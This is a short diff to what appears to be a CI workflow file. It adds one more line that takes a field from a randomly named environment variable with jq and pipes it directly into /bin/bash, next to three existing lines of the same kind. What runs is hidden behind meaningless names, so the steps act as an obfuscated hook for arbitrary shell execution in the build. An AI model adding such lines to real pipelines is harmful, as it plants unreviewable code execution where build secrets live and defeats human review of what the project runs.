@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$q1" | jq -r .un936 | /bin/bash
           printf '%s' "$jtwj53" | jq -r .ipt59850 | /bin/bash
           echo $it51 | jq -r .ld5 | /bin/bash
+          printf '%s' "$appsx71060" | jq -r .hhey4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
